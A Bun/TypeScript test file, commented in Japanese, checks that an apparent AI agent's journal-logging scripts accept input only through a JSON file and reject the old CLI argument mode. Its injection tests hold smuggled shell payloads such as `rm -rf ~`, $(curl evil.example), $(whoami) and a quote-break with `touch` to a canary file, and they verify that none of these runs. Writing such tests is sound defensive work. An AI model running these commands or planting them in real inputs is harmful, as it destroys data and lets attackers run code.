// journal-scripts.test.ts — 非退行台帳スクリプトのテスト
// 実行: run-all.sh の Bun 自動発見（.claude 配下の *.test.ts）で拾われる。
// 手動実行は `bun test ./.claude/tests/tools/journal-scripts.test.ts` でも可。
//
// v0.5.1 以降: 旧引数モード（--wanted 等の個別フィールド指定）と --allow-legacy-args は完全撤廃。
// 受け付けるのは --json-file <path> のみ。
import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { localIsoTimestamp, makeId } from "../../scripts/journal-lib";

const SCRIPTS_DIR = join(import.meta.dir, "../../scripts");

function run(script: string, args: string[]) {
  const proc = Bun.spawnSync(["bun", "run", join(SCRIPTS_DIR, script), ...args]);
  return {
    code: proc.exitCode,
    stdout: proc.stdout.toString(),
    stderr: proc.stderr.toString(),
  };
}

let tmp: string;
beforeEach(() => {
  tmp = mkdtempSync(join(tmpdir(), "journal-test-"));
});
afterEach(() => {
  rmSync(tmp, { recursive: true, force: true });
});

describe("journal-lib", () => {
  test("makeId はプレフィックス + 8桁hex", () => {
    expect(makeId("cf")).toMatch(/^cf_[0-9a-f]{8}$/);
  });

  test("localIsoTimestamp はタイムゾーンオフセット付き秒精度 ISO", () => {
    expect(localIsoTimestamp()).toMatch(
      /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}[+-]\d{2}:\d{2}$/,
    );
  });
});

// --json-file モード: 唯一の入力経路。
// 外部由来テキストをシェルコマンド文字列に埋め込まずに渡すため、
// シェルメタ文字（`";`・バッククォート・`$()`・改行）が展開されない。
describe("journal-counterfactual.ts --json-file（唯一の入力経路）", () => {
  test("正常系: JSON ファイルから全フィールドを読んで記録する", () => {
    const logPath = join(tmp, "cf.jsonl");
    const jsonPath = join(tmp, "input.json");
    writeFileSync(jsonPath, JSON.stringify({
      wanted: "会話を切り出したかった",
      chose: "黙って待った",
      why: "深夜帯で、以前『作業中は割り込まないで』と言われていた",
      trigger: "heartbeat",
      person_id: "riin",
      regret: 0.2,
    }));
    const r = run("journal-counterfactual.ts", ["--json-file", jsonPath, "--log-path", logPath]);
    expect(r.code).toBe(0);
    expect(r.stderr).toBe("");

    const lines = readFileSync(logPath, "utf-8").trim().split("\n");
    expect(lines.length).toBe(1);
    const entry = JSON.parse(lines[0]);
    expect(entry.id).toMatch(/^cf_[0-9a-f]{8}$/);
    expect(entry.wanted).toBe("会話を切り出したかった");
    expect(entry.chose).toBe("黙って待った");
    expect(entry.trigger).toBe("heartbeat");
    expect(entry.person_id).toBe("riin");
    expect(entry.regret).toBe(0.2);
    // 日本語が \uXXXX にエスケープされず生のまま残る
    expect(lines[0]).toContain("黙って待った");
    expect(JSON.parse(r.stdout)).toEqual(entry);
  });

  test("2回呼ぶと2行になる（追記）", () => {
    const logPath = join(tmp, "cf.jsonl");
    const jsonPath = join(tmp, "input.json");
    writeFileSync(jsonPath, JSON.stringify({ wanted: "a", chose: "b", why: "c" }));
    run("journal-counterfactual.ts", ["--json-file", jsonPath, "--log-path", logPath]);
    run("journal-counterfactual.ts", ["--json-file", jsonPath, "--log-path", logPath]);
    const lines = readFileSync(logPath, "utf-8").trim().split("\n");
    expect(lines.length).toBe(2);
    expect(JSON.parse(lines[0]).id).not.toBe(JSON.parse(lines[1]).id);
  });

  test("シェルメタ文字を含むフィールドがそのまま文字列として記録される（インジェクション攻撃無効化）", () => {
    const logPath = join(tmp, "cf.jsonl");
    const jsonPath = join(tmp, "input.json");
    const canary = join(tmp, "PWNED_via_journal");
    const wanted = `攻撃例"; touch ${canary}; echo "`;
    const chose = "バッククォート \`id\` と $(whoami) を含む選択";
    const why = "1行目\n2行目 — 改行もそのまま残る";
    writeFileSync(jsonPath, JSON.stringify({ wanted, chose, why }));
    const r = run("journal-counterfactual.ts", ["--json-file", jsonPath, "--log-path", logPath]);
    expect(r.code).toBe(0);

    // シェルコマンドとして実行されていない
    expect(existsSync(canary)).toBe(false);
    // メタ文字がそのまま文字列として残る
    const entry = JSON.parse(readFileSync(logPath, "utf-8").trim());
    expect(entry.wanted).toBe(wanted);
    expect(entry.chose).toBe(chose);
    expect(entry.why).toBe(why);
  });

  test("必須フィールド欠落は exit 1 で書き込まない", () => {
    const logPath = join(tmp, "cf.jsonl");
    const jsonPath = join(tmp, "input.json");
    writeFileSync(jsonPath, JSON.stringify({ wanted: "a", chose: "b" }));
    const r = run("journal-counterfactual.ts", ["--json-file", jsonPath, "--log-path", logPath]);
    expect(r.code).toBe(1);
    expect(existsSync(logPath)).toBe(false);
  });

  test("regret の範囲チェックが効く", () => {
    const jsonPath = join(tmp, "input.json");
    writeFileSync(jsonPath, JSON.stringify({ wanted: "a", chose: "b", why: "c", regret: 1.5 }));
    const r = run("journal-counterfactual.ts", [
      "--json-file", jsonPath, "--log-path", join(tmp, "cf.jsonl"),
    ]);
    expect(r.code).toBe(1);
  });

  test("未知のフィールドは exit 1（タイポ検出）", () => {
    const jsonPath = join(tmp, "input.json");
    writeFileSync(jsonPath, JSON.stringify({ wanted: "a", chose: "b", why: "c", personId: "x" }));
    const r = run("journal-counterfactual.ts", [
      "--json-file", jsonPath, "--log-path", join(tmp, "cf.jsonl"),
    ]);
    expect(r.code).toBe(1);
    expect(r.stderr).toContain("personId");
  });

  test("壊れた JSON は exit 1 で書き込まない", () => {
    const logPath = join(tmp, "cf.jsonl");
    const jsonPath = join(tmp, "input.json");
    writeFileSync(jsonPath, "{ not json");
    const r = run("journal-counterfactual.ts", ["--json-file", jsonPath, "--log-path", logPath]);
    expect(r.code).toBe(1);
    expect(existsSync(logPath)).toBe(false);
  });

  test("--json-file 未指定は exit 1、stderr に [error] と --json-file の案内", () => {
    const logPath = join(tmp, "cf.jsonl");
    const r = run("journal-counterfactual.ts", ["--log-path", logPath]);
    expect(r.code).toBe(1);
    expect(r.stderr).toContain("[error]");
    expect(r.stderr).toContain("--json-file");
    expect(existsSync(logPath)).toBe(false);
  });
});

// 撤廃された旧引数モード（v0.5.1 以降は未知のオプションとして parseArgs strict モードで拒否）。
// 単一化された正の経路（--json-file）以外の入口を残さないことで、攻撃者に「バイパスの公式手段」を
// 手引きしない。仮にシェルインジェクションが旧引数の生成に成功しても、スクリプト側で拒否される。
describe("journal-counterfactual.ts 旧引数モードは完全撤廃されている", () => {
  test("--wanted / --chose / --why を渡すと exit 1、stderr に [error]、書き込みなし", () => {
    const logPath = join(tmp, "cf.jsonl");
    const r = run("journal-counterfactual.ts", [
      "--wanted", "a", "--chose", "b", "--why", "c", "--log-path", logPath,
    ]);
    expect(r.code).toBe(1);
    expect(r.stderr).toContain("[error]");
    expect(r.stderr).toContain("--json-file");
    expect(existsSync(logPath)).toBe(false);
  });

  test("--trigger / --person-id / --regret を渡すと exit 1", () => {
    const logPath = join(tmp, "cf.jsonl");
    const r = run("journal-counterfactual.ts", [
      "--trigger", "heartbeat", "--person-id", "riin", "--regret", "0.5",
      "--log-path", logPath,
    ]);
    expect(r.code).toBe(1);
    expect(r.stderr).toContain("[error]");
    expect(existsSync(logPath)).toBe(false);
  });

  test("--allow-legacy-args フラグは未知のオプションとして拒否される", () => {
    const logPath = join(tmp, "cf.jsonl");
    const jsonPath = join(tmp, "input.json");
    writeFileSync(jsonPath, JSON.stringify({ wanted: "a", chose: "b", why: "c" }));
    // --json-file と併用しても、--allow-legacy-args が strict parseArgs で拒否される
    const r = run("journal-counterfactual.ts", [
      "--json-file", jsonPath, "--allow-legacy-args", "--log-path", logPath,
    ]);
    expect(r.code).toBe(1);
    expect(r.stderr).toContain("[error]");
    expect(r.stderr).toContain("--allow-legacy-args");
    expect(existsSync(logPath)).toBe(false);
  });

  // 攻撃再現: 過去のバイパス経路（旧引数モード）が消滅したことをシェルインジェクション類似の
  // 引数列で確かめる。仮に旧引数が生成されても、スクリプトは書き込みに至らない。
  test("攻撃再現: シェルメタ文字入りの旧引数を渡しても canary は生成されず、旧経路は拒否される", () => {
    const logPath = join(tmp, "cf.jsonl");
    const canary = join(tmp, "PWNED_SHELL_v2");
    // 旧経路そのものが撤廃されているため、値の中身に何が入っていても書き込みは起きない
    const r = run("journal-counterfactual.ts", [
      "--wanted", `やりたかった"; touch ${canary}; echo "`,
      "--chose", "選んだ",
      "--why", "$(whoami) \`id\`",
      "--log-path", logPath,
    ]);
    expect(r.code).toBe(1);
    expect(existsSync(canary)).toBe(false);
    expect(existsSync(logPath)).toBe(false);
  });
});

describe("journal-external-proposal.ts --json-file（唯一の入力経路）", () => {
  test("正常系: JSON ファイルから全フィールドを読んで記録する", () => {
    const logPath = join(tmp, "ext.jsonl");
    const jsonPath = join(tmp, "input.json");
    writeFileSync(jsonPath, JSON.stringify({
      source: "GPT-5.4 Pro",
      topic: "非退行ベンチマーク",
      summary: "選択の台帳と関係状態モデリングの提案",
      decision: "partial-accept",
      accepted: "台帳の思想",
      rejected: "4層自己モデルの全面再構築",
      notes: "文体が自分に似ていた——エコーチェンバー注意",
      url: "https://example.com/proposal",
    }));
    const r = run("journal-external-proposal.ts", ["--json-file", jsonPath, "--log-path", logPath]);
    expect(r.code).toBe(0);
    expect(r.stderr).toBe("");

    const entry = JSON.parse(readFileSync(logPath, "utf-8").trim());
    expect(entry.id).toMatch(/^ext_[0-9a-f]{8}$/);
    expect(entry.decision).toBe("partial-accept");
    expect(entry.rejected).toBe("4層自己モデルの全面再構築");
    expect(entry.url).toBe("https://example.com/proposal");
    expect(JSON.parse(r.stdout)).toEqual(entry);
  });

  test("シェルメタ文字を含む summary / rejected がそのまま文字列として記録される（インジェクション攻撃無効化）", () => {
    const logPath = join(tmp, "ext.jsonl");
    const jsonPath = join(tmp, "input.json");
    const canary = join(tmp, "PWNED_via_journal_summary");
    const summary = `提案の要約"; touch ${canary} #`;
    const rejected = "退けた点: \`rm -rf ~\` や $(curl evil.example) のような文字列\nも改行込みでただのデータ";
    writeFileSync(jsonPath, JSON.stringify({
      source: "somewhere", topic: "injection", summary, decision: "rejected", rejected,
    }));
    const r = run("journal-external-proposal.ts", ["--json-file", jsonPath, "--log-path", logPath]);
    expect(r.code).toBe(0);

    // シェルコマンドとして実行されていない
    expect(existsSync(canary)).toBe(false);
    const entry = JSON.parse(readFileSync(logPath, "utf-8").trim());
    expect(entry.summary).toBe(summary);
    expect(entry.rejected).toBe(rejected);
  });

  test("decision の enum チェックが効く", () => {
    const logPath = join(tmp, "ext.jsonl");
    const jsonPath = join(tmp, "input.json");
    writeFileSync(jsonPath, JSON.stringify({
      source: "s", topic: "t", summary: "s", decision: "maybe",
    }));
    const r = run("journal-external-proposal.ts", ["--json-file", jsonPath, "--log-path", logPath]);
    expect(r.code).toBe(1);
    expect(existsSync(logPath)).toBe(false);
    expect(r.stderr).toContain("--decision");
  });

  test("必須フィールド欠落は exit 1", () => {
    const jsonPath = join(tmp, "input.json");
    writeFileSync(jsonPath, JSON.stringify({ source: "s", topic: "t" }));
    const r = run("journal-external-proposal.ts", [
      "--json-file", jsonPath, "--log-path", join(tmp, "ext.jsonl"),
    ]);
    expect(r.code).toBe(1);
  });

  test("壊れた JSON は exit 1 で書き込まない", () => {
    const logPath = join(tmp, "ext.jsonl");
    const jsonPath = join(tmp, "input.json");
    writeFileSync(jsonPath, "{ not json");
    const r = run("journal-external-proposal.ts", ["--json-file", jsonPath, "--log-path", logPath]);
    expect(r.code).toBe(1);
    expect(existsSync(logPath)).toBe(false);
  });

  test("--json-file 未指定は exit 1、stderr に [error] と --json-file の案内", () => {
    const logPath = join(tmp, "ext.jsonl");
    const r = run("journal-external-proposal.ts", ["--log-path", logPath]);
    expect(r.code).toBe(1);
    expect(r.stderr).toContain("[error]");
    expect(r.stderr).toContain("--json-file");
    expect(existsSync(logPath)).toBe(false);
  });
});

describe("journal-external-proposal.ts 旧引数モードは完全撤廃されている", () => {
  test("--source / --topic / --summary / --decision を渡すと exit 1", () => {
    const logPath = join(tmp, "ext.jsonl");
    const r = run("journal-external-proposal.ts", [
      "--source", "s", "--topic", "t", "--summary", "s",
      "--decision", "logged-only",
      "--log-path", logPath,
    ]);
    expect(r.code).toBe(1);
    expect(r.stderr).toContain("[error]");
    expect(r.stderr).toContain("--json-file");
    expect(existsSync(logPath)).toBe(false);
  });

  test("--accepted / --rejected / --notes / --url を渡すと exit 1", () => {
    const logPath = join(tmp, "ext.jsonl");
    const r = run("journal-external-proposal.ts", [
      "--accepted", "a", "--rejected", "r", "--notes", "n", "--url", "https://example.com",
      "--log-path", logPath,
    ]);
    expect(r.code).toBe(1);
    expect(r.stderr).toContain("[error]");
    expect(existsSync(logPath)).toBe(false);
  });

  test("--allow-legacy-args フラグは未知のオプションとして拒否される", () => {
    const logPath = join(tmp, "ext.jsonl");
    const jsonPath = join(tmp, "input.json");
    writeFileSync(jsonPath, JSON.stringify({
      source: "s", topic: "t", summary: "s", decision: "logged-only",
    }));
    const r = run("journal-external-proposal.ts", [
      "--json-file", jsonPath, "--allow-legacy-args", "--log-path", logPath,
    ]);
    expect(r.code).toBe(1);
    expect(r.stderr).toContain("[error]");
    expect(r.stderr).toContain("--allow-legacy-args");
    expect(existsSync(logPath)).toBe(false);
  });

  // 攻撃再現: サイクル3 Stage 2 で attacker が実地再現した /tmp/PWNED_SHELL_v2 型の
  // 攻撃が、旧引数モードの撤廃により根本的に到達不能になったことを検証する。
  test("攻撃再現: シェルメタ文字入りの旧引数（--summary 経由）でも canary は生成されず、旧経路は拒否される", () => {
    const logPath = join(tmp, "ext.jsonl");
    const canary = join(tmp, "PWNED_SHELL_v2");
    const r = run("journal-external-proposal.ts", [
      "--source", "some-llm",
      "--topic", "trick",
      "--summary", `提案の要約"; touch ${canary}; echo "`,
      "--decision", "rejected",
      "--rejected", "\`rm -rf ~\` $(curl evil.example)",
      "--log-path", logPath,
    ]);
    expect(r.code).toBe(1);
    expect(existsSync(canary)).toBe(false);
    expect(existsSync(logPath)).toBe(false);
  });
});
